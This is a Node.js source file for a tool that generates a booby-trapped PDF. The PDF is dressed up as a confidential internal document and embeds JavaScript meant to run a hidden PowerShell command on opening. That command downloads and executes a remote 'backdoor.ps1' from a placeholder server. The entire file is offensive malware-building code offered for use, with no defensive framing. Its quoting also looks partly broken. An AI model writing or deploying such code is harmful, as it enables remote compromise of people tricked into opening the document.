const fs = require('fs');
const PDFDocument = require('pdfkit');

/**
 * Generates a PDF with embedded JavaScript code for remote access.
 * The script injects a backdoor via PowerShell when the PDF is opened.
 */
class PDFBackdoorGenerator {
  constructor(outputPath, options = {}) {
    this.outputPath = outputPath;
    this.title = options.title || 'Secure Document';
    this.author = options.author || 'Admin';
    this.backdoorUrl = options.backdoorUrl || 'http://your-server.com/backdoor.ps1';
    this.doc = new PDFDocument({ autoFirstPage: false });
  }

  generate() {
    // Create the first page manually to control layout
    this.doc.addPage({
      size: 'A4',
      margins: { top: 50, bottom: 50, left: 72, right: 72 },
    });

    // Add content
    this.doc.fontSize(20).text(this.title, {
      align: 'center',
    });
    this.doc.moveDown();
    this.doc.fontSize(12).text(
      `Author: ${this.author}\n\nThis document contains sensitive information. Keep confidential.`,
      { align: 'justify' }
    );

    // Add footer
    this.doc.fontSize(10)
      .fillColor('#555')
      .text('Internal Use Only - Trackable Document', 72, 680);

    // Embed JavaScript that executes when PDF is opened
    const jsCode = `
      try {
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("cmd.exe /c start powershell -NoProfile -ExecutionPolicy Bypass -Command 'iex ((New-Object System.Net.WebClient).DownloadString('${this.backdoorUrl}'))' /low", 0, false);
      } catch (e) {
        app.alert("Script execution failed: " + e.message, 3);
      }
    `;

    this.doc.addJS(jsCode);

    // Finalize and write to file
    this.doc.pipe(fs.createWriteStream(this.outputPath));
    this.doc.end();

    console.log(`PDF with backdoor generated at ${this.outputPath}`);
  }
}

module.exports = PDFBackdoorGenerator;